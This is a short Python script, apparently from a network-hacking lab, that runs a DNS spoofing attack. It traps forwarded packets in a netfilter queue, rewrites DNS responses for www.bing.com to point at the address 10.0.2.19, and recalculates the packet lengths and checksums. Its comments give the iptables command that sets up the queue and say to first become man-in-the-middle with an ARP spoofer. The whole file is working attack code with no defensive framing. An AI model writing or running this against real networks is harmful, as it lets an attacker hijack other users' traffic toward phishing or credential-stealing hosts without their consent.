#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

#use iptables -I FORWARD -j NFQUEUE --queue-num 0 to trap packets in a queue 
#use ARP SPOOFER to become MITM 

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) #more data on the packet by converting it to a scapy packet
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        if 'www.bing.com' in qname:
            print("[+] Spoofing Target ")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.19")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            pp = bytes(scapy_packet)
            packet.set_payload(pp)
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


